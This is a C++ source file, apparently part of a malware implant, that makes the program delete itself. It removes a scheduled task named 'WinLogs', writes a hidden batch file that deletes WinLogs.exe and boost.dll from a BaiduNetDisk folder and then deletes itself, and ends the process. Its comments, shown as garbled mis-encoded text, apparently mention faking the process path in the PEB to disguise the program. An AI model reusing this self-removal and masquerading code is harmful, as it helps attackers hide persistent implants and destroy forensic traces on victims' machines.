#include "pch.h"
#include "Delete.h"

BOOL CreatePingBat(char* pszBatFileName)
{
	int iTime = 5;
	char szBat[MAX_PATH] = { 0 };

	// ��������������
	/*
		@echo off
		ping 127.0.0.1 -n 5
		del *.exe
		del *.dll
		del %0
	*/
	::StringCchPrintfA(szBat, sizeof(szBat), 
		"@echo off\nping 127.0.0.1 -n %d\ndel C:\\BaiduNetDisk\\WinLogs.exe\ndel C:\\BaiduNetDisk\\boost.dll\ndel %%0\n", iTime);

	// �����������ļ�
	FILE* fp = NULL;
	fopen_s(&fp, pszBatFileName, "w+");
	if (NULL == fp)
	{
		OutputDebugStringA("cannot open batfile\r\n");
		return FALSE;
	}
	fwrite(szBat, (1 + ::lstrlen(szBat)), 1, fp);
	fclose(fp);

	return TRUE;
}

BOOL DelSelf()
{
	// ɾ��������
	CMyTaskSchedule task1;
	task1.Delete((char *)"WinLogs");

	BOOL bRet = FALSE;
	char szBatFileName[MAX_PATH] = { 0 };
	char szCmd[MAX_PATH] = { 0 };

	// ��ȡ��ǰ��������Ŀ¼
	// ���������Ѿ��޸���PEB�е�·����Ϣ�Դﵽ����αװ��Ŀ��
	// �������ﲻ��ʹ��GetModuleFileName��ȡ������·����Ϣ
	
	char* p = strrchr(g_szCurrentDirectory, '\\');
	p[0] = '\0';
	// �����������ļ�·��
	::StringCchPrintfA(szBatFileName, sizeof(szBatFileName), 
		"%s\\temp.bat", g_szCurrentDirectory);
	// �������ִ��������� CMD ������
	::StringCchPrintfA(szCmd, sizeof(szCmd), "cmd /c call \"%s\"", szBatFileName);

	// ������ɾ�����������ļ�
	bRet = CreatePingBat(szBatFileName);

	// �����µĽ���, �����ؿ���̨�ķ�ʽִ��������
	if (bRet)
	{
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi;
		si.cb = sizeof(si);
		//ָ��wShowWindow��Ա��Ч
		si.dwFlags = STARTF_USESHOWWINDOW;
		//�˳�Ա��ΪTRUE�Ļ�����ʾ�½����̵�������
		si.wShowWindow = FALSE;
		BOOL bRet = CreateProcess(
			//���ڴ�ָ����ִ���ļ����ļ���
			NULL,
			//�����в���
			szCmd,
			//Ĭ�Ͻ��̰�ȫ��
			NULL,
			//Ĭ�Ͻ��̰�ȫ��
			NULL,
			//ָ����ǰ�����ھ�������Ա��ӽ��̼̳�
			FALSE,
			//Ϊ�½��̴���һ���µĿ���̨����
			CREATE_NEW_CONSOLE,
			//ʹ�ñ����̵Ļ�������
			NULL,
			//ʹ�ñ����̵���������Ŀ¼
			NULL,
			&si,
			&pi);
		if (bRet)
		{
			//��ʹ�õľ����ùص�
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);

			// ��������
			exit(0);
			::ExitProcess(NULL);
		}
	}

	return bRet;
}